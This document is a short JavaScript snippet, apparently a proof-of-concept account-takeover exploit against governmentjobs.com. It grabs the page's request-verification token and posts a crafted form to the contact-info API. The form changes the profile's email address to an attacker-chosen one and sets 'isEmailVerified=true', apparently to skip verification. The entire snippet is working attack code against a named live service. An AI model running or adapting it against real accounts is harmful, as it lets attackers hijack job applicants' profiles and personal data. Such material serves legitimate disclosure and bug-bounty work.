let tokenValue = document.querySelector('input[name="__RequestVerificationToken"]').value;

const headers = {
    '__requestverificationtoken': tokenValue,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'https://www.governmentjobs.com',
    'Referer': 'https://www.governmentjobs.com/ProfileSettings',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Te': 'trailers'
};

const data = 'isDiscardChange=false&enableEmailVerification=true&fromAppProcess=false&isEmailVerified=true&isAccountSettingsPage=false&name%5BfirstName%5D=ss&name%5BmiddleName%5D=&name%5BlastName%5D=sss&name%5BformerName%5D=&address%5Baddress1%5D=ww&address%5Baddress2%5D=ss&address%5Bcity%5D=ss&address%5Bstate%5D%5Bid%5D=54&address%5Bstate%5D%5BabbrvState%5D=IT&address%5Bstate%5D%5Bname%5D=&address%5Bstate%5D%5BcountryId%5D=0&address%5BzipCode%5D=10001&address%5Bcountry%5D%5Bid%5D=2&address%5Bcountry%5D%5Bname%5D=Afghanistan&address%5BfilteredStates%5D%5B0%5D%5Bid%5D=54&address%5BfilteredStates%5D%5B0%5D%5BabbrvState%5D=IT&address%5BfilteredStates%5D%5B0%5D%5Bname%5D=International&address%5BfilteredStates%5D%5B0%5D%5BsortCode%5D=2&address%5BfilteredStates%5D%5B0%5D%5BisUs%5D=false&address%5BfilteredStates%5D%5B0%5D%5BcountryId%5D=0&phone%5BprimaryPhone%5D=&phone%5BprimaryPhoneExt%5D=&phone%5BalternatePhone%5D=&phone%5BalternatePhoneExt%5D=&textCaptchaViewModel%5BuserAnswer%5D=&textCaptchaViewModel%5BisBusy%5D=false&textCaptchaViewModel%5BcustomLabelHtmlContent%5D=&textCaptchaViewModel%5BcustomUserAnswerInputId%5D=&initialEmail=poc4mrxx%2Bletx%40gmail.com&emailAddress=poc4mrxx%2Bletxtakeoversuccess%40gmail.com&isPasswordSet=true&textCaptchaEnabled=true&isEmailVerificationMode=false&showCaptchaValidationMessage=false&isEmailAddressAvailable=true&changeEmailNotification=Your+current+email+address+is+poc4mrxx%2Bletx%40gmail.com.+To+change+the+email+address%2C+please+visit+account+settings+page.&notificationPreference=1';

fetch('https://www.governmentjobs.com/api/generalInfo/contactInfo?fromAppProcess=false&returnUrl=https%253A%252F%252Fwww.governmentjobs.com%252FProfileSettings%2523general', {
    method: 'POST',
    headers: headers,
    body: data
})
.then(response => response.json())
.then(data => console.log('Success:', data))
.catch(error => console.error('Error:', error));
